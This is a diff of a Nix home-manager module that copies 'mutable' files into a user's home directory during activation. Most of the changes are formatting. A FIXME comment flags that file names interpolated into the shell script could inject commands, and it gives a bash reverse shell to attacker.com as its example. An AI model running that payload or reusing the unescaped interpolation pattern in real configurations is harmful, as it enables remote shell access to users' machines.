@@ -2,7 +2,6 @@
 {
   config,
   lib,
-  pkgs,
   ...
 }: {
   options.custom.mutable = let
@@ -32,10 +31,12 @@
   config = let
     cfg = config.custom.mutable;
   in {
-    assertions = lib.attrsets.mapAttrsToList (name: value: {
-      assertion = lib.filesystem.pathIsRegularFile value.source;
-      message = "Mutable file ${name} must be a regular file, not a directory or symlink";
-    }) cfg.file;
+    assertions =
+      lib.attrsets.mapAttrsToList (name: value: {
+        assertion = lib.filesystem.pathIsRegularFile value.source;
+        message = "Mutable file ${name} must be a regular file, not a directory or symlink";
+      })
+      cfg.file;
 
     # TODO: Copy files from a derivation to the user's home directory
     # TODO: Use this for VS code config
@@ -44,9 +45,10 @@
     # run on reboot and rebuild, so they could overwrite changes.
     # FIXME: This is super insecure, A reverse shell could be injected using a file named "${bash -i >& /dev/tcp/attacker.com/1234 0>&1}"
     home.activation.install-mutable = lib.hm.dag.entryAfter ["writeBoundary"] ''
-        ${lib.concatStringsSep "\n" (lib.attrsets.mapAttrsToList (name: value: ''
+      ${lib.concatStringsSep "\n" (lib.attrsets.mapAttrsToList (name: value: ''
           run cp --force "${value.source}" "${name}"
-        '') cfg.file)}
-      '';
+        '')
+        cfg.file)}
+    '';
   };
 }
